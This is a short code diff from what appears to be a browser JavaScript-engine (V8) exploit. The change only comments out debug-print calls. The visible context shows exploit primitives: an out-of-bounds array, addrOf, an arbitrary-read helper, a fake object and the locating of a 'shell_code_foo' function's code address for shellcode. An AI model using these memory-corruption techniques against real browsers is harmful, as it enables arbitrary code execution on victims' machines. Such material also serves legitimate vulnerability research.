@@ -470,11 +470,11 @@
     var aarw_arr = [1.1,3.3];
     gc();
     gc();
-    %DebugPrint(oob_arr_draft);
-    %DebugPrint(addrOf_dict);
-    %DebugPrint(aarw_arr);
-    %DebugPrint(fake_obj_str);
-    %DebugPrint(sloppy_func);
+    // %DebugPrint(oob_arr_draft);
+    // %DebugPrint(addrOf_dict);
+    // %DebugPrint(aarw_arr);
+    // %DebugPrint(fake_obj_str);
+    // %DebugPrint(sloppy_func);
     alert("dbg");
     var oob_arr;
   
@@ -544,10 +544,10 @@
             alert("[+]oob arr lenghth :" + hex(oob_arr.length));
             var foo_addr = addrOf(shell_code_foo) & 0xffffffffn;
             alert("[+]foo addr :" + hex(foo_addr));
-            %DebugPrint(oob_arr_draft);
-            %DebugPrint(addrOf_dict);
-            %DebugPrint(aarw_arr);
-            %DebugPrint(shell_code_foo);
+            // %DebugPrint(oob_arr_draft);
+            // %DebugPrint(addrOf_dict);
+            // %DebugPrint(aarw_arr);
+            // %DebugPrint(shell_code_foo);
             // %DebugPrint(oob_arr);
             var code_addr = arbRead(foo_addr + 0x18n) & 0xffffffffn;
             alert("[+]code addr : " + hex(code_addr));
